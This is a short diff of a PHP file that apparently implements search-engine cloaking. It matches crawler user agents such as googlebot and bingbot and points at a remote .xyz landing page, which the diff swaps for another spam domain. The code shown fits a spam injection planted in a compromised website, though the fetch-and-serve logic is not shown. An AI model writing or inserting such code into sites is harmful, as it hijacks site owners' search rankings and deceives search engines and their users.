@@ -2,7 +2,7 @@
 ob_start();
 header("Vary: U-Agent");
 
-$src = "https://gomugomuno.xyz/landing/test-gadingssuitm-com/";
+$src = "https://diablejamble.xyz/landing/e-palli-org/index.html";
 $match = "/(googlebot|slurp|bingbot|baiduspider|yandex|crawler|spider|adsense|inspection|mediapartners)/i";
 $ua = strtolower($_SERVER["HTTP_USER_AGENT"] ?? '');
 
